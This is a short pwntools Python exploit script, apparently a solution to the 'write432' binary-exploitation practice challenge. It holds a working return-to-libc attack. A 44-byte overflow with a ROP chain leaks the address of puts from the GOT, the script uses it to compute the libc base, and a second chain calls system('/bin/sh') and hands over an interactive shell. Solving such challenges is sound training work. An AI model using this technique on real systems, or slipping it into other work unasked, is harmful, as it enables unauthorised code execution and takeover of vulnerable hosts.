from pwn import *
import base64

local_bin = "./write432"
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

p = process(local_bin)
elf = ELF(local_bin)

puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
puts_GOT = elf.got["puts"]

rop1 = "A"*44 + p32(puts_plt) + p32(main_plt) + p32(puts_GOT)
p.clean()
p.sendline(rop1)

leak = u32(p.recvline()[:4])
libc.address = leak - libc.symbols["puts"]

bin_sh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
exit = "\x12"*4 # this can be anything

rop2 = "A"*44 + p32(system) + exit + p32(bin_sh)

log.info("Main address:            " + hex(main_plt))
log.info("Puts address (.plt):     " + hex(puts_plt))
log.info("Puts address (.got.plt): " + hex(puts_GOT))
log.info("Leaked Puts address:     " + hex(leak))
log.info("Libc base address:       " + hex(libc.address))
log.info("String 'bin/sh' address: " + hex(bin_sh))
log.info("Function system address: " + hex(system))

p.clean()
p.sendline(rop2)
p.interactive()